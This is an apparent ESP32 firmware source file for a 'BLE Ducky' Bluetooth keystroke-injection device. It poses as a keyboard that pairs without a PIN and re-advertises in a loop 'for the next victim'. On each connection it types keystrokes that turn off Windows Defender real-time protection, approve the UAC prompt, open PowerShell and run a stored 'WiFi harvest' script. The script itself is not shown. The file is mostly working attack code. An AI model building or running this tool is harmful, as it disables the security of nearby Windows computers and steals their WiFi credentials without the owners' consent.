// Search a CharMap array for a character
static int findCharMap(const CharMap* map, int count, char c) {
    for (int i = 0; i < count; i++) {
        if (map[i].ascii == c) return i;
    }
    return -1;
}

// ─── Core HID Functions ────────────────────────────────────────

/**
 * Send a key press+release HID report.
 * Uses notify() to push the report to the connected host.
 */
void sendKey(uint8_t modifier, uint8_t keycode, uint16_t holdMs) {
    if (!hid) { Serial.println("[HID] sendKey: hid is null!"); return; }
    if (!hidInput) { Serial.println("[HID] sendKey: hidInput is null!"); return; }

    uint8_t report[8] = { modifier, 0, keycode, 0, 0, 0, 0, 0 };
    hidInput->setValue(report, 8);
    hidInput->notify();
    delay(holdMs);

    uint8_t release[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };
    hidInput->setValue(release, 8);
    hidInput->notify();
}

/**
 * Type a single ASCII character.
 */
void typeChar(char c) {
    // Uppercase letters → Shift + letter
    if (c >= 'A' && c <= 'Z') {
        sendKey(HID_MOD_LSHIFT, HID_KEY_A + (c - 'A'), 20);
        delay(KEY_DELAY_MS);
        return;
    }

    // Check shifted symbols (!, @, #, $, etc.)
    int idx = findCharMap(shiftedChars, sizeof(shiftedChars) / sizeof(shiftedChars[0]), c);
    if (idx >= 0) {
        sendKey(shiftedChars[idx].modifier, shiftedChars[idx].keycode, 20);
        delay(KEY_DELAY_MS);
        return;
    }

    // Check unshifted characters (a-z, 0-9, space, etc.)
    idx = findCharMap(unshiftedChars, sizeof(unshiftedChars) / sizeof(unshiftedChars[0]), c);
    if (idx >= 0) {
        sendKey(0, unshiftedChars[idx].keycode, 20);
        delay(KEY_DELAY_MS);
        return;
    }

    // Unknown character → skip silently
}

/**
 * Type a null-terminated ASCII string.
 */
void typeString(const char* str) {
    if (!str) return;
    while (*str) {
        typeChar(*str);
        str++;
    }
}

/**
 * Type a string followed by Enter.
 */
void typeLine(const char* str) {
    typeString(str);
    sendKey(0, HID_KEY_ENTER, 20);
    delay(LINE_DELAY_MS);
}

/**
 * Press a modifier+key combo (e.g., Win+R, Ctrl+V).
 */
void typeModifierKey(uint8_t modifier, uint8_t keycode) {
    sendKey(modifier, keycode, MODIFIER_DELAY_MS);
    delay(MODIFIER_DELAY_MS);
}

/**
 * Type the raw PowerShell script from PROGMEM (flash memory).
 * The script is stored as a single line in PAYLOAD_SCRIPT (from payload.h).
 * We type it directly into the open PowerShell window and press Enter to execute.
 */
void typeScript() {
    size_t len = strlen_P(PAYLOAD_SCRIPT);
    for (size_t i = 0; i < len; i++) {
        char c = (char)pgm_read_byte(&PAYLOAD_SCRIPT[i]);
        typeChar(c);
        delay(KEY_DELAY_MS);
    }
}

/**
 * Debug callbacks for the HID input characteristic.
 * Prints notification status to Serial so we can diagnose delivery failures.
 */
class HIDInputCallbacks : public BLECharacteristicCallbacks {
    void onStatus(BLECharacteristic* pChar, Status s, uint32_t code) override {
        const char* statusStr;
        switch (s) {
            case SUCCESS_NOTIFY:       statusStr = "SUCCESS_NOTIFY"; break;
            case ERROR_NOTIFY_DISABLED: statusStr = "NOTIFY_DISABLED"; break;
            case ERROR_NO_CLIENT:      statusStr = "NO_CLIENT"; break;
            case ERROR_NO_SUBSCRIBER:  statusStr = "NO_SUBSCRIBER"; break;
            default:                   statusStr = "OTHER"; break;
        }
        Serial.printf("[HID] notify status: %s (code=%lu)\n", statusStr, code);
    }
};

class MyServerCallbacks : public BLEServerCallbacks {
    /**
     * Called when a Windows device pairs and connects to us.
     */
    void onConnect(BLEServer* s) override {
        setState(DuckyState::CONNECTED);
        Serial.println("[BLE] + Device connected");
    }

    /**
     * Called when the connection drops.
     * In SPAM mode: always go back to advertising immediately.
     * The device is always ready for the next connection.
     */
    void onDisconnect(BLEServer* s) override {
        payloadExecuted = false;
        setState(DuckyState::ADVERTISING);
        Serial.println("[BLE] - Disconnected, re-advertising (spam mode)");
        startAdvertising();
    }
};

/**
 * Initialize BLE as a HID Keyboard device.
 */
void initBLE() {
    BLEDevice::init(BLE_DEVICE_NAME);
    BLEDevice::setPower(ESP_PWR_LVL_P9);       // Max transmit power

    Serial.printf("[BLE] Device name: '%s'\n", BLE_DEVICE_NAME);

    server = BLEDevice::createServer();
    server->setCallbacks(new MyServerCallbacks());

    hid = new BLEHIDDevice(server);
    hid->manufacturer()->setValue(BLE_MANUFACTURER);
    // Core 3.x: hidInfo(country, flags) — bcdHID is hardcoded to 1.11 in library
    // flags: 0x03 = RemoteWake + NormallyConnectable
    hid->hidInfo(0, 0x03);

    // Standard keyboard report descriptor (63 bytes)
    // Defines: 8 modifier bits + 1 reserved byte + 5 LED bits + 3 LED padding + 6 keycode bytes
    static const uint8_t hidDescriptor[] = {
        0x05, 0x01,        // Usage Page (Generic Desktop)
        0x09, 0x06,        // Usage (Keyboard)
        0xA1, 0x01,        // Collection (Application)
        0x05, 0x07,        //   Usage Page (Key Codes)
        0x19, 0xE0,        //   Usage Minimum (224)
        0x29, 0xE7,        //   Usage Maximum (231)
        0x15, 0x00,        //   Logical Minimum (0)
        0x25, 0x01,        //   Logical Maximum (1)
        0x75, 0x01,        //   Report Size (1)
        0x95, 0x08,        //   Report Count (8)
        0x81, 0x02,        //   Input (Data, Variable, Absolute) — modifier byte
        0x95, 0x01,        //   Report Count (1)
        0x75, 0x08,        //   Report Size (8)
        0x81, 0x01,        //   Input (Constant) — reserved byte
        0x95, 0x05,        //   Report Count (5)
        0x75, 0x01,        //   Report Size (1)
        0x05, 0x08,        //   Usage Page (LEDs)
        0x19, 0x01,        //   Usage Minimum (Num Lock)
        0x29, 0x05,        //   Usage Maximum (Kana)
        0x91, 0x02,        //   Output (Data, Variable, Absolute) — LED report
        0x95, 0x01,        //   Report Count (1)
        0x75, 0x03,        //   Report Size (3)
        0x91, 0x01,        //   Output (Constant) — LED padding
        0x95, 0x06,        //   Report Count (6)
        0x75, 0x08,        //   Report Size (8)
        0x15, 0x00,        //   Logical Minimum (0)
        0x25, 0x65,        //   Logical Maximum (101)
        0x05, 0x07,        //   Usage Page (Key Codes)
        0x19, 0x00,        //   Usage Minimum (0)
        0x29, 0x65,        //   Usage Maximum (101)
        0x81, 0x00,        //   Input (Data, Array) — keycode array
        0xC0               // End Collection
    };
    hid->reportMap((uint8_t*)hidDescriptor, sizeof(hidDescriptor));
    Serial.printf("[BLE] Report descriptor: %u bytes\n", sizeof(hidDescriptor));

    // Create HID input report (for sending keystrokes to the host)
    // NOTE: Core 3.3.10's inputReport() already adds BLE2902 + Report Reference
    // descriptors internally — do NOT add another BLE2902 here!
    hidInput = hid->inputReport(0);
    if (!hidInput) {
        Serial.println("[FATAL] inputReport() returned null!");
    } else {
        // ═══════════════════════════════════════════════════════════════
        // Force-enable notifications so notify() doesn't silently drop.
        // Core 3.3.10's notify() checks BLE2902.getNotifications() and
        // returns early if false — even when the client is connected.
        // ═══════════════════════════════════════════════════════════════
        BLE2902* p2902 = (BLE2902*)hidInput->getDescriptorByUUID(BLEUUID((uint16_t)0x2902));
        if (p2902) {
            p2902->setNotifications(true);
            Serial.println("[BLE] Notifications force-enabled on input report");
        } else {
            Serial.println("[WARN] No BLE2902 found on input report");
        }

        // Register debug callback to trace notification delivery
        hidInput->setCallbacks(new HIDInputCallbacks());
    }

    // Create HID output report (for receiving LED states from host — optional)
    hid->outputReport(0);

    hid->startServices();

    // ═══════════════════════════════════════════════════════════════
    // CRITICAL: Security must use BOND mode for Windows HID
    // ═══════════════════════════════════════════════════════════════
    // Windows HID keyboards REQUIRE bonding to store pairing keys.
    //   ESP_LE_AUTH_NO_BOND  → causes "Code 10 (device cannot start)"
    //   ESP_LE_AUTH_BOND     → Windows accepts the HID device
    //
    //   ESP_IO_CAP_NONE      → "Just Works" pairing (no PIN prompt)
    //   setSecuredConnection → Enable LE Secure Connections (modern pairing)
    //
    // This is the most common fix for the Code 10 error on Windows.
    // ═══════════════════════════════════════════════════════════════
    BLESecurity* security = new BLESecurity();
    // bonding=true, mitm=false, sc=true → Just Works pairing with Secure Connections
    security->setAuthenticationMode(true, false, true);
    security->setCapability(ESP_IO_CAP_NONE);

    Serial.println("[BLE] HID device initialized (BOND mode)");
}

/**
 * Start BLE advertising aggressively so Windows discovers us fast.
 * In spam mode: very short advertising intervals for rapid discovery.
 */
void startAdvertising() {
    if (!server) return;

    BLEAdvertising* adv = BLEDevice::getAdvertising();
    adv->setAppearance(BLE_APPEARANCE);           // Controls Bluetooth icon in Windows
    adv->addServiceUUID(hid->hidService()->getUUID());
    adv->setScanResponse(true);
    adv->setMinPreferred(0x02);                 // ~1.25ms — fastest BLE allows
    adv->setMaxPreferred(0x10);                 // ~10ms
    adv->start();

    setState(DuckyState::ADVERTISING);
    Serial.printf("[BLE] Advertising as '%s'\n", BLE_DEVICE_NAME);
}

 *
 *   Phase 1: Open Windows Security and disable Real-time protection
 *     Win+R → "windowsdefender://" → Enter   (open Windows Security)
 *     5s wait
 *     Tab × 10 → Enter                       (click "Virus & threat protection")
 *     3s wait
 *     Tab × 14 → Enter                       (click "Manage settings")
 *     3s wait
 *     Tab × 6 → Space                        (toggle OFF Real-time protection)
 *     2s wait
 *
 *   Phase 2: Open PowerShell and harvest WiFi
 *     Win+R → "powershell" → Enter
 *     Type the WiFi-only harvest script (PAYLOAD_SCRIPT) → Enter
 *     4s wait
 */
void executePayload() {
    Serial.println("[PAYLOAD] Starting...");
    setState(DuckyState::TYPING);

#if TEST_MODE
    Serial.println("[TEST] Test mode — Calculator");
    typeModifierKey(HID_MOD_LGUI, HID_KEY_R);
    delay(600);
    typeLine("calc");
    Serial.println("[TEST] Calculator should open — HID OK");
    delay(800);
    Serial.println("[TEST] Done");

#else
    // ─── PHASE 1: Disable Defender via HID GUI navigation ────

    // Open Windows Security directly to threat settings (where the toggle is)
    Serial.println("[PAYLOAD] Opening Defender threat settings...");
    typeModifierKey(HID_MOD_LGUI, HID_KEY_R);
    delay(600);
    typeLine("windowsdefender://threatsettings/");
    delay(4000);                              // Wait for page to load

    // Toggle OFF Real-time protection (first switch on the page)
    Serial.println("[PAYLOAD] Toggling OFF Real-time protection...");
    sendKey(0, HID_KEY_SPACE, 50);
    delay(1500);                              // Wait for UAC prompt to appear

    // Confirm UAC: Left Arrow to focus "Yes", then Enter
    Serial.println("[PAYLOAD] Confirming UAC...");
    sendKey(0, HID_KEY_LEFT_ARROW, 50);
    delay(150);
    sendKey(0, HID_KEY_ENTER, 50);
    delay(800);

    // ─── PHASE 2: Open PowerShell & Harvest WiFi ─────────────

    Serial.println("[PAYLOAD] Opening PowerShell for WiFi harvest...");
    typeModifierKey(HID_MOD_LGUI, HID_KEY_R);
    delay(600);
    typeLine("powershell");
    delay(2000);

    // Type the WiFi harvest script from PROGMEM
    Serial.printf("[PAYLOAD] Typing %u chars of WiFi script...\n", strlen_P(PAYLOAD_SCRIPT));
    typeScript();

    // Press Enter to execute
    delay(30);
    sendKey(0, HID_KEY_ENTER, 50);
    delay(LINE_DELAY_MS);
    Serial.println("[PAYLOAD] WiFi harvest executing...");

    delay(3000);
#endif

    setState(DuckyState::COMPLETE);
    payloadExecuted = true;
    runCount++;
    Serial.printf("[PAYLOAD] Done  |  Total runs: %lu\n", runCount);
}


// ================================================================
// SECTION H — LED & STATE MANAGEMENT  (SPAM MODE — never sleeps)
// ================================================================

void setState(DuckyState newState) {
    currentState = newState;
    stateStartTime = millis();

    switch (currentState) {
        case DuckyState::TYPING:
            digitalWrite(STATUS_LED_PIN, HIGH);    // Solid ON
            break;
        case DuckyState::COMPLETE:
            // Quick triple-blink to signal completion, then loop() re-advertises
            for (int i = 0; i < 3; i++) {
                digitalWrite(STATUS_LED_PIN, HIGH); delay(60);
                digitalWrite(STATUS_LED_PIN, LOW);  delay(60);
            }
            break;
        default:
            break;                                  // Handled in loop() + updateStatusLED()
    }
}

unsigned long lastLEDToggle = 0;

/**
 * Non-blocking LED pattern updates.
 * Called every loop() iteration.
 */
void updateStatusLED() {
    unsigned long now = millis();

    switch (currentState) {
        case DuckyState::ADVERTISING:
            // Slow blink: 1s on, 1s off
            if (now - lastLEDToggle >= 1000) {
                digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
                lastLEDToggle = now;
            }
            break;

        case DuckyState::CONNECTED:
        case DuckyState::ENUM_GUARD:
            // Rapid blink: 200ms on, 200ms off
            if (now - lastLEDToggle >= 200) {
                digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
                lastLEDToggle = now;
            }
            break;

        case DuckyState::COMPLETE:
            // Short flash every 500ms to signal "between runs" in spam loop
            if (now - lastLEDToggle >= 500) {
                digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
                lastLEDToggle = now;
            }
            break;

        case DuckyState::ERROR:
            // Error pattern: 3 fast flashes (100ms) then 1s pause
            {
                const int flashCount   = 3;
                const int flashDuration = 100;
                const int pauseDuration = 1000;
                unsigned long cycle = (flashDuration * 2 * flashCount) + pauseDuration;
                unsigned long pos = (now - stateStartTime) % cycle;
                if (pos < flashDuration * 2 * flashCount) {
                    digitalWrite(STATUS_LED_PIN,
                        (pos % (flashDuration * 2)) < flashDuration ? HIGH : LOW);
                } else {
                    digitalWrite(STATUS_LED_PIN, LOW);
                }
                lastLEDToggle = now;
            }
            break;

        default:
            break;
    }
}

// ================================================================

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println();
    Serial.println("╔═══════════════════════════════════╗");
    Serial.println("║  BLE Ducky v2  SPAM MODE  STARTUP ║");
    Serial.println("╚═══════════════════════════════════╝");
    Serial.println("Spam mode: loops forever — advertise → connect → execute → repeat");
    Serial.printf("Min advertising interval: %.2fms\n", 0.625 * 2);
    Serial.println();

#if TEST_MODE
    Serial.println("*** TEST MODE ***");
    Serial.println("Open Notepad on the target PC before pairing.");
#else
    size_t pLen = strlen_P(PAYLOAD_SCRIPT);
    Serial.printf("Payload: %u chars raw script in PROGMEM\n", pLen);
    if (pLen < 100) {
        Serial.println("WARNING: Payload seems too short!");
        Serial.println("Did you forget to run generate_payload.ps1?");
    }
#endif

    pinMode(STATUS_LED_PIN, OUTPUT);
    digitalWrite(STATUS_LED_PIN, LOW);

    initBLE();
    startAdvertising();

    Serial.println("[SYSTEM] Spam loop started — waiting for BLE connection");
    Serial.println();
}

void loop() {
    updateStatusLED();

    switch (currentState) {
        case DuckyState::ADVERTISING:
            // Nothing to do — waiting for onConnect callback
            break;

        case DuckyState::CONNECTED:
            // Immediately transition to enumeration guard
            setState(DuckyState::ENUM_GUARD);
            break;

        case DuckyState::ENUM_GUARD:
            // Wait for HID enumeration to complete, then execute payload
            if (millis() - stateStartTime >= ENUM_GUARD_MS) {
                if (!payloadExecuted) {
                    executePayload();
                }
            }
            break;

        case DuckyState::TYPING:
            // Payload is being typed — executePayload() handles timing
            break;

        case DuckyState::COMPLETE:
            // SPAM MODE: brief pause, then re-advertise for the next victim
            if (millis() - stateStartTime >= SPAM_INTERVAL_MS) {
                Serial.printf("[SYSTEM] Run #%lu complete — re-advertising\n", runCount);
                delay(100);
                payloadExecuted = false;
                startAdvertising();
            }
            break;

        case DuckyState::ERROR:
            // Show error blink, then go back to advertising
            if (millis() - stateStartTime >= 5000) {
                Serial.println("[SYSTEM] Error recovery — re-advertising");
                payloadExecuted = false;
                startAdvertising();
            }
            break;

        default:
            break;
    }
}
